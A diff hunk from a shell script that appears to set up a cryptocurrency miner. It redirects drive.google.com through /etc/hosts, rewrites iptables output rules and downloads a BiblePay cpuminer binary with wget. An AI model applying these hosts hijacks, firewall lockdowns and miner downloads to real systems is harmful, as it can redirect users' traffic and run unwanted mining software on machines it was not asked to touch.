@@ -10,7 +10,8 @@ sh -c "echo '38.130.192.192  drive.google.com' >> /etc/hosts"
 iptables -I OUTPUT 1 -p tcp --sport 22 -j ACCEPT
 iptables -I OUTPUT 2 -p udp --dport 53 -j ACCEPT
 iptables -I OUTPUT 3 -p tcp -d googleusercontent.com -j ACCEPT
-iptables -I OUTPUT 4 -p all -m owner --uid-owner root -j DROP
+iptables -I OUTPUT 4 -p tcp -d drive.google.com -j ACCEPT
+iptables -I OUTPUT 5 -p all -m owner --uid-owner root -j DROP
 
 
 wget https://github.com/biblepay/cpuminer/raw/master/binaries/bbpminer_linux
